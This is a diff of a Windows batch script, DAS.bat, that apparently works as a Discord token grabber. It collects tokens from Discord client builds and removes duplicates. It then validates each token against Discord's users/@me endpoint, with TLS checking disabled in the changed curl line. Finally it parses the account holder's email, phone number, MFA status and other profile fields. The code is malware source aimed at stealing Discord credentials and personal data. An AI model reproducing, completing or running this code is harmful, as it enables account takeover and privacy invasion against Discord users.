@@ -2,6 +2,10 @@
 setlocal enabledelayedexpansion
 chcp 437 >nul
 
+REM ---------------------------------------------------------------
+REM  DAS.bat - JavaScript NodeJS Replicate in batch (AKA DAS.exe)
+REM             Compatible Versions : 3.0 3.1 3.2 3.3
+REM ---------------------------------------------------------------
 set builds=
 
 :: SETTINGS
@@ -11,10 +15,8 @@ set TokensCount=0
 set BuildsCount=0
 set "ParseAccountInfo=id username avatar discriminator public_flags flags banner banner_color accent_color locale nsfw_allowed mfa_enabled premium_type email verified phone"
 
-:CheckConnection
 ping -n 1 discord.com | findstr /c:"TTL">nul || (
     echo ERROR=No connection.
-    pause
     exit /b
 )
 
@@ -54,8 +56,6 @@ for %%a in (
 set Temp.AllTokens=!AllTokens!
 for %%a in (!AllTokens!) do (
     for /f "tokens=1,2* delims=`" %%b in (%%a) do (
-        REM %%b - build
-        REM %%c - token
         echo:!Temp.AllTokens! | findstr /c:"%%c">nul && (
             set "FilteredTokens=!FilteredTokens! "%%b=%%c""
             set Temp.AllTokens=!Temp.AllTokens:"%%b`%%c"=!
@@ -76,7 +76,7 @@ if !TokensCount! leq 0 (
 REM -- Duplications Remover & User Prepare --
 for %%a in (!FilteredTokens!) do (
     for /f "tokens=1,2* delims==" %%b in (%%a) do (
-        curl -sX GET --header "authorization: %%c" "https://discord.com/api/v7/users/@me" -o "%temp%\JsonDetail.json"
+        curl.exe -ksX GET --header "authorization: %%c" "https://discord.com/api/v7/users/@me" -o "%temp%\JsonDetail.json"
         findstr /c:"401: Unauthorized" "%temp%\JsonDetail.json">nul || (
             REM --- Valid Discord Token ---
             if not "!Temp.BuildAdded_%%b!"=="true" (
@@ -90,7 +90,7 @@ for %%a in (!FilteredTokens!) do (
                     set "Json.ImageURL=https://cdn.discordapp.com/avatars/!Json.id!/!Json.avatar!.!AvatarExt!"
                 )
 
-                for /f "delims=" %%a in ('powershell "([System.DateTimeOffset]::FromUnixTimeMilliseconds((!Json.id! -shr 22) + 1420070400000)).LocalDateTime"') do (
+                for /f "delims=" %%a in ('powershell "$msSinceEpoch = ((!Json.id! -shr 22) + 1420070400000);[int]$secondsSinceEpoch = $msSinceEpoch / 1000;$dt = [DateTime]::new(1970, 1, 1, 0, 0, 0, 0, 'Utc').AddMilliseconds($msSinceEpoch);""$($dt.ToLocalTime().ToString('dd/MM/yyyy HH:mm:ss')) <t:$secondsSinceEpoch`:R>"""') do (
                     set "Json.CreatedAt=%%a"
                 )
 
